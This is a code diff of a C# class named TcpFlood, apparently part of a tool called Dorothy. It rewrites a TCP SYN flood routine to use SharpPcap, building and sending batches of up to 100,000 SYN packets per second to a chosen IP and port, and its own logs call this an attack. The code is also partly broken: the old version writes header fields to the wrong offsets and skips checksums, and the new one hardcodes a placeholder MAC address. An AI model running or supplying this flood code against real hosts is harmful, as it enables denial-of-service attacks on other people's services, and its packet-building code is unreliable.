@@ -1,12 +1,9 @@
 using System;
 using System.Net;
-using System.Runtime.InteropServices;
+using System.Net.Sockets;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Diagnostics;
 using NLog;
-using System.Security.Principal;
-using System.Text;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
@@ -15,215 +12,154 @@ namespace Dorothy.Models
 {
     public class TcpFlood : IDisposable
     {
-        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
-        public const int PACKET_SIZE = 54;  // Ethernet (14) + IP (20) + TCP (20)
-        private const int IPPROTO_TCP = 6;
-
-        private volatile bool _isRunning;
         private readonly string _sourceIp;
-        private readonly byte[] _sourceMac;
         private readonly string _targetIp;
-        private readonly byte[] _targetMac;
         private readonly int _targetPort;
-        private readonly long _bytesPerSecond;
-        private long _totalPacketsSent;
-        private readonly Stopwatch _stopwatch;
-        private readonly CancellationToken _cancellationToken;
-        private readonly List<IntPtr> _handles;
-        private readonly Random _random;
+        private readonly long _megabitsPerSecond;
+        private readonly CancellationToken _token;
+        private readonly Action<string> _logAction;
+        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
 
-        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
-        private static extern IntPtr pcap_open_live(string device, int snaplen, int promisc, int to_ms, StringBuilder errbuf);
-
-        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
-        private static extern int pcap_sendpacket(IntPtr p, byte[] buf, int size);
-
-        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
-        private static extern void pcap_close(IntPtr p);
-
-        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
-        private static extern IntPtr pcap_findalldevs(out IntPtr alldevs, StringBuilder errbuf);
-
-        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
-        private static extern void pcap_freealldevs(IntPtr alldevs);
-
-        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
-        private static extern uint inet_addr(string cp);
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
-        private struct pcap_if
+        public TcpFlood(string sourceIp, string targetIp, int targetPort, long megabitsPerSecond, CancellationToken token, Action<string> logAction)
         {
-            public IntPtr next;
-            public string name;
-            public string description;
-            // Additional fields omitted for brevity
-        }
-
-        // Constructor
-        public TcpFlood(
-            string sourceIp,
-            byte[] sourceMac,
-            string targetIp,
-            byte[] targetMac,
-            int targetPort,
-            long bytesPerSecond,
-            CancellationToken cancellationToken)
-        {
-            _sourceIp = sourceIp ?? throw new ArgumentNullException(nameof(sourceIp));
-            _sourceMac = sourceMac ?? throw new ArgumentNullException(nameof(sourceMac));
-            _targetIp = targetIp ?? throw new ArgumentNullException(nameof(targetIp));
-            _targetMac = targetMac ?? throw new ArgumentNullException(nameof(targetMac));
+            _sourceIp = sourceIp;
+            _targetIp = targetIp;
             _targetPort = targetPort;
-            _bytesPerSecond = bytesPerSecond;
-            _cancellationToken = cancellationToken;
-            _stopwatch = new Stopwatch();
-            _handles = new List<IntPtr>();
-            _random = new Random();
+            _megabitsPerSecond = megabitsPerSecond;
+            _token = token;
+            _logAction = logAction;
         }
 
         public async Task StartAsync()
         {
             try
             {
-                if (pcap_findalldevs(out IntPtr alldevs, new StringBuilder(256)) == IntPtr.Zero)
+                // Calculate packets per second based on Mbps
+                long bytesPerSecond = _megabitsPerSecond * 125_000; // 1 Mbps = 125,000 Bytes
+                int packetsPerSecond = (int)(bytesPerSecond / 64); // Approximate size per SYN packet (IP + TCP headers)
+
+                // Cap the packets per second to prevent system overload
+                packetsPerSecond = Math.Min(packetsPerSecond, 100_000); // Example cap at 100,000 packets/sec
+                if (packetsPerSecond <= 0) packetsPerSecond = 1;
+
+                _logAction?.Invoke($"TCP SYN Flood: Sending {packetsPerSecond} SYN packets per second ({_megabitsPerSecond} Mbps).");
+
+                // Initialize SharpPcap device
+                var devices = CaptureDeviceList.Instance;
+                if (devices.Count < 1)
                 {
-                    string deviceName = GetSuitableDeviceName(alldevs);
-                    if (deviceName == null)
-                    {
-                        Logger.Error("No suitable network interface found");
-                        throw new InvalidOperationException("No suitable network interface found");
-                    }
-                    pcap_freealldevs(alldevs);
-
-                    Logger.Info($"Using network device: {deviceName}");
-
-                    var handle = pcap_open_live(deviceName, 65536, 1, 1000, new StringBuilder(256));
-                    if (handle == IntPtr.Zero)
-                    {
-                        Logger.Error("Failed to open device");
-                        throw new InvalidOperationException("Failed to open device");
-                    }
-
-                    _handles.Add(handle);
-                    _isRunning = true;
-                    _stopwatch.Start();
-
-                    Logger.Info($"Starting TCP SYN flood to {_targetIp}:{_targetPort} at {_bytesPerSecond} bytes/sec");
-
-                    await Task.Run(() => Flood(), _cancellationToken);
+                    Log("No capture devices found.");
+                    return;
                 }
-                else
+
+                // Select the first device (modify as needed)
+                var device = devices[0];
+                device.Open();
+
+                // Resolve MAC addresses using ARP or set manually
+                System.Net.NetworkInformation.PhysicalAddress targetMac = GetMacAddress(_targetIp);
+                if (targetMac == null)
                 {
-                    Logger.Error("Failed to find devices");
-                    throw new InvalidOperationException("Failed to find devices");
+                    Log($"Failed to resolve MAC address for {_targetIp}.");
+                    return;
                 }
+
+                System.Net.NetworkInformation.PhysicalAddress sourceMac = GetMacAddress(_sourceIp); // Ensure this is set correctly
+
+                var sourceIpAddress = IPAddress.Parse(_sourceIp);
+                var targetIpAddress = IPAddress.Parse(_targetIp);
+
+                while (!_token.IsCancellationRequested)
+                {
+                    var synPackets = new List<Packet>();
+
+                    for (int i = 0; i < packetsPerSecond; i++)
+                    {
+                        // Build Ethernet Layer
+                        var ethernet = new EthernetPacket(sourceMac, targetMac, EthernetType.IPv4);
+
+                        // Build IP Layer
+                        var ipLayer = new IPv4Packet(sourceIpAddress, targetIpAddress)
+                        {
+                            Protocol = PacketDotNet.ProtocolType.Tcp,
+                            TimeToLive = 128
+                        };
+
+                        // Build TCP Layer
+                        var tcpLayer = new TcpPacket(0, (ushort)_targetPort)
+                        {
+                            SequenceNumber = (uint)new Random().Next(0, int.MaxValue),
+                            WindowSize = 64240,
+                            Synchronize = true
+                        };
+
+                        // No payload for SYN packet
+
+                        // Combine layers
+                        ipLayer.PayloadPacket = tcpLayer;
+                        ethernet.PayloadPacket = ipLayer;
+
+                        synPackets.Add(ethernet);
+                    }
+
+                    // Send all SYN packets
+                    foreach (var pkt in synPackets)
+                    {
+                        device.SendPacket(pkt);
+                    }
+
+                    _logAction?.Invoke($"TCP SYN Flood: Sent {packetsPerSecond} SYN packets.");
+
+                    // Wait for 1 second before sending the next batch
+                    await Task.Delay(1000, _token);
+                }
+
+                device.Close();
+            }
+            catch (OperationCanceledException)
+            {
+                Log("TCP SYN Flood attack canceled.");
             }
             catch (Exception ex)
             {
-                Logger.Error(ex, "Error in TcpFlood.StartAsync");
-                throw;
+                Logger.Error(ex, "Error during TCP SYN Flood.");
+                _logAction?.Invoke($"TCP SYN Flood attack error: {ex.Message}");
             }
-        }
-
-        private void Flood()
-        {
-            while (!_cancellationToken.IsCancellationRequested)
+            finally
             {
-                var sourcePort = (ushort)_random.Next(1024, 65535);
-                var packet = CreateTcpSynPacket(sourcePort);
-                foreach (var handle in _handles)
-                {
-                    pcap_sendpacket(handle, packet, packet.Length);
-                    _totalPacketsSent++;
-                }
-                // Control the rate
-                Thread.Sleep(1000);
+                Log("TCP SYN Flood attack stopped.");
             }
         }
 
-        private byte[] CreateTcpSynPacket(ushort sourcePort)
+        private System.Net.NetworkInformation.PhysicalAddress GetMacAddress(string ipAddress)
         {
-            byte[] packet = new byte[PACKET_SIZE];
-            // Initialize Ethernet header
-            Array.Copy(_sourceMac, 0, packet, 0, 6);
-            Array.Copy(_targetMac, 0, packet, 6, 6);
-            packet[12] = 0x08;
-            packet[13] = 0x00; // IPv4
-
-            // Initialize IP header
-            packet[14] = 0x45; // Version and IHL
-            packet[16] = 0x40; // TTL
-            packet[17] = (byte)IPPROTO_TCP;
-            // Total Length
-            ushort totalLength = (ushort)(20 + 20);
-            packet[16] = (byte)(totalLength >> 8);
-            packet[17] = (byte)(totalLength & 0xFF);
-            // Source IP
-            Array.Copy(IPAddress.Parse(_sourceIp).GetAddressBytes(), 0, packet, 26, 4);
-            // Destination IP
-            Array.Copy(IPAddress.Parse(_targetIp).GetAddressBytes(), 0, packet, 30, 4);
-
-            // Initialize TCP header
-            Array.Copy(BitConverter.GetBytes(IPAddress.HostToNetworkOrder((short)sourcePort)), 0, packet, 34, 2);
-            Array.Copy(BitConverter.GetBytes(IPAddress.HostToNetworkOrder((short)_targetPort)), 0, packet, 36, 2);
-            // SYN flag
-            packet[47] = 0x02;
-
-            // Calculate checksums
-            // (Checksum calculation omitted for brevity)
-
-            return packet;
+            // Implement ARP resolution or use a static MAC address
+            // For simplicity, using a placeholder MAC address
+            return new System.Net.NetworkInformation.PhysicalAddress(new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B });
         }
 
-        private string? GetSuitableDeviceName(IntPtr alldevs)
+        private void Log(string message)
         {
-            IntPtr current = alldevs;
-            while (current != IntPtr.Zero)
+            try
             {
-                pcap_if device = Marshal.PtrToStructure<pcap_if>(current);
-                if (device.description != null && device.description.Contains("NPF"))
-                {
-                    return device.name;
-                }
-                current = device.next;
+                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                var logMessage = $"[{timestamp}] {message}\n";
+
+                // Assuming _logAction handles UI logging
+                _logAction?.Invoke(logMessage);
+
+                Logger.Debug(message);
             }
-            return null;
-        }
-
-        public void Stop()
-        {
-            if (!_isRunning) return;
-
-            _isRunning = false;
-            _stopwatch.Stop();
-
-            foreach (var handle in _handles)
+            catch (Exception ex)
             {
-                try
-                {
-                    pcap_close(handle);
-                }
-                catch (Exception ex)
-                {
-                    Logger.Error(ex, "Error closing pcap handle");
-                }
+                // Fallback logging in case of failure
+                Logger.Error(ex, "Logging failed.");
             }
-            _handles.Clear();
         }
 
         public void Dispose()
         {
-            Stop();
-        }
-
-        public double GetElapsedSeconds()
-        {
-            return _stopwatch.Elapsed.TotalSeconds;
-        }
-
-        public long GetTotalPackets()
-        {
-            return _totalPacketsSent;
+            // Implement disposal logic if needed
         }
     }
 }
